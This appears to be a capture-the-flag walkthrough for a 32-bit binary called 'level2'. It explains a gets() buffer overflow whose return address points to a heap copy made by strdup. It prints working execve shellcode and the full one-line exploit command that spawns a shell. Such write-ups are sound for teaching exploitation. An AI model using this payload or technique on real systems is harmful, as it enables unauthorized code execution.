#Title  
  
## Disassembled code  
`gdb -batch -ex "set disassembly-flavor intel" -ex "disas main" -ex "disas p" "level2" | GREP_COLOR='01;33' grep  --color=always -z '+36\|+39\|+44\|+49' | GREP_COLOR='01;32' grep --color=always -z '+51\|+56\|+59\|+63\|+66\|+71\|+78' | GREP_COLOR='01;31' grep -z '+83\|+86\|+89\|+89\|+94\|+97\|+100\|+105\|+106'`  
![alt IMAGE] (Ressources/disassembled.png)  
  
  
##walkthrough  
At *p+25, we can see a call to the gets function, we can use another way to enter manualy the value when we come to this instruction. We'll use the '<<<' redirection at the binary argument to enter the gets value.
  
At *p+36 we can see we move the [ebp-0xc] value in eax, [ebp-0xc] represents the 4 bytes from the 80th that we passed to GETS, we can see below:  
  
![alt IMAGE] (Ressources/p_36_value_ebp_0xc.png)  

We have find this offset with msfvenom and pattern\_offset tools like the two pictures below:  
  
Generate pattern with msfvenom:  
![alt IMAGE] (Ressources/msf_venom_p_36.png)  
  
We can see at the 0xffffd08c address ($ebp-0xc) we have the pattern (0x37634136) for get the offset with the pattern\_offset tool:  
  
![alt IMAGE] (Ressources/p_36_pattern_offset_tool.png)  
  
At *p+39, we can see the *and* operator, it keep just equal bits to both operands. In our case wedo not have to have a *b* in first bit, because the program don't segfault in this case.

![alt IMAGE] (Ressources/info_proc_all.png)  
  
That's a shame, because we have our 80 bytes are on the stack and the stack addres beginng by 0xb, you can show this *0x41* bytes:  
  
![alt IMAGE] (Ressources/stack_bytes.png)  
  
we can see at *p+100 strdup is called with our payload in argument  
  
![alt IMAGE] (Ressources/p_100_strdup_args.png)  
  
strdup return a string on the heap, we can show that on the return register (eax).

![alt IMAGE] (Ressources/p_105_strdup_return.png)  
  
We can see It's not a 0xb address, we can put a payload here  
  
I was get a payload on [shellstorm](http://shell-storm.org/shellcode/files/shellcode-841.php)
  
Let's test this on gdb:  
`(gdb) r <<< $(python -c "print  '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'A' * (80 - 21) + '\x08\xa0\x04\x08'")`  
  
![alt IMAGE] (Ressources/exploit_with_gdb.png)

Ok, /bin/dash is started on gdb and exit directly, we can use this command to get the level3 right:
`(python -c "print  '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'A' * (80 - 21) + '\x08\xa0\x04\x08'";cat) | ./level2`
  
![alt IMAGE] (Ressources/finish.png)
